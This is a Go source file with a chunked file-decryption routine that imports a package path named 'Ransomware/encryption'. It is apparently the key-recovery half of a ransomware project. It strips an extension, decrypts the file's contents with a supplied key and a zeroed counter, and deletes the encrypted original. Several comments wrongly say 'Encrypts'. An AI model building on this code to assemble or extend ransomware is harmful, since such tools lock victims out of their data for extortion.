package file

import (
	"Ransomware/encryption"
	"os"
)

// Decrypt : decrypts file with key
func Decrypt(fileSrc string, key []byte) (string, error) {

	decryptedFileName := fileSrc[0 : len(fileSrc)-3]
	encryptedFile, err := os.Open(fileSrc)

	counter := []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}

	if err != nil {
		return "", err
	}

	fi, err := encryptedFile.Stat()

	if err != nil {
		return "", err
	}

	//Reads Data from file
	var i int64
	data := make([]byte, MaxSize)
	iterations := fi.Size() / int64(MaxSize)

	//Creates encrypted File
	decryptedFile, err := os.Create(decryptedFileName)

	if err != nil {
		return "", err
	}

	defer decryptedFile.Close()

	//Encrypts chunks of MaxSize data to encrypted file
	for i = 0; i < iterations; i++ {
		encryptedFile.Read(data)
		encryption.Decrypt(&data, &key, &counter)
		_, err = decryptedFile.Write(data)
		if err != nil {
			return "", err
		}

		decryptedFile.Sync()
	}

	//Encrypts remaining of file (less then MaxSize)
	if fi.Size()%int64(MaxSize) != 0 {
		data = make([]byte, fi.Size()-iterations*int64(MaxSize))
		encryptedFile.Read(data)
		encryption.Decrypt(&data, &key, &counter)
		_, err = decryptedFile.Write(data)
		if err != nil {
			return "", err
		}

		decryptedFile.Sync()
	}

	encryptedFile.Close()

	os.Remove(fileSrc)

	return decryptedFileName, nil
}
